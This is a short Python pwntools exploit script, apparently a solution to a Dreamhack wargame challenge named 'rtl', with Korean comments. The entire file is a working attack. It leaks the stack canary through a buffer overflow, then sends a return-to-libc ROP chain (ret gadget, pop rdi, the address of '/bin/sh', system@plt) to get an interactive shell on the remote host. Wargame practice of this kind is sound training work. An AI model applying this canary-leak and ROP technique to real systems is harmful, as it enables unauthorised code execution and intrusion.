from pwn import *
context.arch = 'amd64'

# target = process('./rtl')
target = remote('host3.dreamhack.games', '12837')

e = ELF('./rtl')

payload = b'A'*(0x30 + 8 + 1) # buffer length + canary dummy + canary start 'null'
print('payload:', payload)
target.sendafter(b"Buf: ",payload)
target.recvuntil(payload)
canary = b'\x00' + target.recvn(7)
print('canary:', u64(canary))
# system_plt = p64(0x4005e0) # system 함수의 plt 주소
system_plt = p64(e.plt['system'])
bin_sh = p64(0x400874) # /bin/sh 의 주소
pop_gadget = p64(0x0000000000400853) # pop rdi; ret gadget 주소
ret_gadget = p64(0x0000000000400285) # return gadget 주소

payload = (b'A'*0x38 + canary + b'B'*0x8 + ret_gadget + pop_gadget + bin_sh + system_plt); # canary 채우고, SFP를 AAAAAAAA 로 채우고, 'bin/sh' 위치로 변경하고, return address를 system 함수 위치로 변경한다.

print('payload2:',payload)
target.sendafter(b"Buf: ", payload)
target.interactive()

